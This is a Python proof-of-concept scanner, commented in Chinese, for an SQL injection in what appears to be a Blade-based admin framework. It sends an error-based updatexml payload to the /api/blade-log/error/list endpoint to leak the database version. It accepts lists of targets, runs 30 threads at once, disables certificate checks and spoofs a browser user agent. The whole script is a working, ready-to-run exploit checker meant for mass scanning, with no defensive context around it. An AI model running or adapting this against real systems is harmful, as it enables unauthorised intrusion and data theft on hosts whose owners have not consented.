import requests,argparse
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool

def main():
    targets = []
    parse = argparse.ArgumentParser(description="某开源后台框架系统menu接口存在SQL注入漏洞")
    parse.add_argument('-u', '--url', dest='url', type=str, help='input url')
    parse.add_argument('-f', '--file', dest='file', type=str, help='input file')

    args = parse.parse_args()
    pool = Pool(30)

    if args.url:
        if 'http' in args.url:
            check(args.url)
        else:
            target = f"http://{args.url}"
            check(target)
    elif args.file:
        f = open(args.file, 'r+')
        for target in f.readlines():
            target = target.strip()
            if 'http' in target:
                targets.append(target)
            else:
                target = f"http://{target}"
                targets.append(target)
    pool.map(check, targets)
    pool.close()

def check(target):
    target = f"{target}/api/blade-log/error/list?updatexml(1,concat(0x7e,version(),0x7e),1)=1"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        'Connection': 'close',
    }
    try:
        response = requests.get(target, headers=headers, verify=False,timeout=5)
        if response.status_code == 500 and 'msg' in response.text:
            print(f"[+] {target} 存在漏洞！")
        else:
            print(f"[-] {target} 不存在漏洞！")
    except Exception as e:
        print(f"[TimeOut] {target} 超时")

if __name__ == '__main__':
    main()